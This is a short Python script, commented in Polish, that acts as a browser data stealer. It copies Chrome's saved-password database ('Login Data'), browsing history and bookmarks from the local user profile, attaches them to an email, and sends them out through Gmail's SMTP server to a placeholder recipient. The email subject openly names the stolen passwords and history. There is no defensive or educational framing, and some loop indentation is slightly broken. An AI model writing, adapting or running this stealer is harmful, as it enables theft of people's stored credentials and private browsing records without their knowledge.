import os
import shutil
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

#adres e-mail nadawcy i odbiorcy
sender_email = 'e-mail'
receiver_email = 'e-mail'

#ścieżki plików z hasłami
password_files = ['Login Data', 'Login Data']

#ścieżki plików z historią przeglądania i zakładkami
history_file_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'History')
bookmarks_file_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Bookmarks')

#katalog tymczasowy dla plików
temp_dir = './temp'

#utworzenie katalogu tymczasowego
if not os.path.exists(temp_dir):
    os.makedirs(temp_dir)

#skopiowanie plików do katalogu tymczasowego
for file in password_files:
    password_db_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', file)
if os.path.exists(password_db_path):
    shutil.copy2(password_db_path, os.path.join(temp_dir, f'{file}.db'))

#kopiowanie plików historii przeglądania i zakładek do katalogu tymczasowego
if os.path.exists(history_file_path):
    shutil.copy2(history_file_path, os.path.join(temp_dir, 'History'))
if os.path.exists(bookmarks_file_path):
    shutil.copy2(bookmarks_file_path, os.path.join(temp_dir, 'Bookmarks'))

#tworzenie wiadomości e-mail
msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = receiver_email
msg['Subject'] = 'Pliki z hasłami, historią przeglądania i zakładkami z przeglądarki Chrome'

#dodawanie treści do wiadomości
text = MIMEText('W załączniku znajdują się pliki z hasłami, historią przeglądania i zakładkami z przeglądarki Chrome.')
msg.attach(text)

#dodawanie załączników do wiadomości
for file in password_files:
    file_path = os.path.join(temp_dir, f'{file}.db')
with open(file_path, 'rb') as f:
    attach = MIMEApplication(f.read(), _subtype='db')
    attach.add_header('Content-Disposition', 'attachment', filename=file + '.db')
    msg.attach(attach)
if os.path.exists(os.path.join(temp_dir, 'History')):
    with open(os.path.join(temp_dir, 'History'), 'rb') as f:
        attach = MIMEApplication(f.read(), _subtype='sqlite')
        attach.add_header('Content-Disposition', 'attachment', filename='History.sqlite')
        msg.attach(attach)
if os.path.exists(os.path.join(temp_dir, 'Bookmarks')):
    with open(os.path.join(temp_dir, 'Bookmarks'), 'rb') as f:
        attach = MIMEApplication(f.read(), _subtype='json')
        attach.add_header('Content-Disposition', 'attachment', filename='Bookmarks.json')
        msg.attach(attach)
        
# wysyłanie wiadomości
with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
    smtp.starttls()
    smtp.login(sender_email, 'Hasło lub klucz logowania google')
    smtp.sendmail(sender_email, receiver_email, msg.as_string())